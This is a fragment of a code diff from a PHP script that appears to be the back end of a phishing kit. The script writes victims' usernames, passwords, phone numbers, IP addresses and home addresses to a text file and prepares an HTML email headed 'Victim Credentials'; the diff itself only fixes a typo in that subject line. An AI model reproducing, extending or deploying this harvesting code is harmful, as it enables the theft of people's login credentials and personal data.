@@ -17,7 +17,7 @@ $file = fopen('sensitiveinfo.txt', 'a');
 fwrite($file, "Username: ".$user."\n\n" ."Password: ".$pass. "\n\n"."PhoneNumber: ".$pho."\n\n"."Ip Address: " .$ip."\n\n".
 "Country: ".$ulke ."\n\n".   "Time: " .$tarih.  "\n\n\"". "Organization : " .$org."\n\n". "Address:".$addr."\n\n"."Postal :".$pos."\n\n" . "City :" .$city."\n\n" ."country : ".$country."\n\n\n\n");
 fclose($file);
-$subject = "Victim Credential{ $user }";
+$subject = "Victim Credentials{ $user }";
 $message = '
 <center> 
 <div style="padding:5px;width:294;height:auto;background: #222222;color:#ffc;text-align:center;">
